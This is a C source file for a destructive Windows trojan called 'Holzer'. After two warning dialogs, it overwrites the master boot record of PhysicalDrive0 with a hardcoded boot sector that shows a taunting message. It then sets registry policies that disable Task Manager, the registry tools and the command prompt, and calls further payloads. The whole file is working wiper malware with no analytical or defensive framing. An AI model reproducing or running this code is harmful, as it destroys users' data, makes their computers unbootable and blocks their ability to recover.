#include "stuff.h"

int main() {
	ShowWindow(GetConsoleWindow(), SW_HIDE);

	if (MessageBoxA(0, "You are about to run a malware.\n\n\
Use this malware wisely, this will cause data loss and makes your computer likely unbootable.\n\
If you don't know what is this program do, just click 'No' to keep your computer safe.\n\
When clicking 'Yes', the malware will start and you'll understand the risk. If you want to\n\
try this, then use a secure environment, like a Virtual Machine.\n\
The creator is not responsible for any data loss or damage made to your computer.\n\
Execute this malware? You won't be able to use Windows again!\n\n\
WARNING: This malware contain flashing lights and disturbing noises.", "Holzer", MB_YESNO | MB_ICONWARNING) != IDYES) {
		ExitProcess(0);
	}
    if (MessageBoxA(0, "FINAL WARNING!\n\n\
If you have read the previous warning, then you'll keep in mind that your\n\
computer going to be destroyed. Clicking 'Yes' destroys your computer!\n\
You won't be able to use Windows again!\n\
The creator is not responsible for any data loss or damage made to your computer.\n\n\
Do you still wanna execute this malware?", "Holzer", MB_YESNO | MB_ICONWARNING) != IDYES) {
		ExitProcess(0);
	}

	const unsigned char MBRdata[] = {
		0xE8, 0x24, 0x00, 0x8C, 0xC8, 0x8E, 0xD8, 0xBE, 0x5A, 0x7C, 0xE8, 0x00, 0x00, 0x50, 0xFC, 0x8A,
		0x04, 0x3C, 0x00, 0x74, 0x0B, 0xE8, 0x0A, 0x00, 0x46, 0x3C, 0x5D, 0x74, 0x19, 0xF4, 0xEB, 0xEF,
		0xEB, 0xFE, 0xB4, 0x0E, 0xCD, 0x10, 0xC3, 0xB4, 0x07, 0xB0, 0x00, 0xB7, 0x0C, 0xB9, 0x00, 0x00,
		0xBA, 0x4F, 0x18, 0xCD, 0x10, 0xC3, 0xB4, 0x00, 0xCD, 0x16, 0xFA, 0x68, 0x00, 0xA0, 0x07, 0x31,
		0xFF, 0x31, 0xC0, 0xB8, 0x13, 0x00, 0xCD, 0x10, 0xEB, 0x00, 0xB4, 0x0C, 0x04, 0x01, 0xB7, 0x00,
		0x83, 0xC1, 0x03, 0xBA, 0x01, 0x00, 0xCD, 0x10, 0xEB, 0xF0, 0x52, 0x2E, 0x49, 0x2E, 0x50, 0x0D,
		0x0A, 0x0D, 0x0A, 0x59, 0x6F, 0x75, 0x72, 0x20, 0x50, 0x43, 0x20, 0x68, 0x61, 0x73, 0x20, 0x62,
		0x65, 0x65, 0x6E, 0x20, 0x79, 0x65, 0x65, 0x74, 0x65, 0x64, 0x20, 0x62, 0x79, 0x20, 0x74, 0x68,
		0x65, 0x20, 0x48, 0x6F, 0x6C, 0x7A, 0x65, 0x72, 0x20, 0x74, 0x72, 0x6F, 0x6A, 0x61, 0x6E, 0x2E,
		0x0D, 0x0A, 0x45, 0x6E, 0x6A, 0x6F, 0x79, 0x20, 0x79, 0x6F, 0x75, 0x72, 0x20, 0x6E, 0x65, 0x77,
		0x20, 0x50, 0x43, 0x21, 0x20, 0x3A, 0x44, 0x0D, 0x0A, 0x0D, 0x0A, 0x0D, 0x0A, 0x0D, 0x0A, 0x5B,
		0x20, 0x50, 0x72, 0x65, 0x73, 0x73, 0x20, 0x61, 0x6E, 0x79, 0x20, 0x6B, 0x65, 0x79, 0x20, 0x74,
		0x6F, 0x20, 0x63, 0x6F, 0x6E, 0x74, 0x69, 0x6E, 0x75, 0x65, 0x20, 0x5D, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
	};

	DWORD bytes;
	HANDLE drive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

	if (drive == INVALID_HANDLE_VALUE) {
		MessageBoxA(0, "Failed to open hard drive.", "Error", MB_OK | MB_ICONERROR);
		CloseHandle(drive);
		ExitProcess(0);
	}

	if (!WriteFile(drive, MBRdata, 512, &bytes, 0)) {
		MessageBoxA(0, "Failed to overwrite bootloader.", "Error", MB_OK | MB_ICONERROR);
		CloseHandle(drive);
		ExitProcess(0);
	}

	CloseHandle(drive);

	HKEY key;
	LONG reg;
	DWORD data = 1;

	reg = RegCreateKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, 0,
		REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0, &key, 0);
	reg = RegSetValueExW(key, L"DisableTaskMgr", 0, REG_DWORD, (LPBYTE)&data, sizeof(data));
	reg = RegSetValueExW(key, L"DisableRegistryTools", 0, REG_DWORD, (LPBYTE)&data, sizeof(data));

	reg = RegCreateKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", 0, 0,
		REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0, &key, 0);
	reg = RegSetValueExW(key, L"DisableCMD", 0, REG_DWORD, (LPBYTE)&data, sizeof(data));

	RegCloseKey(key);

	startPayloads();
}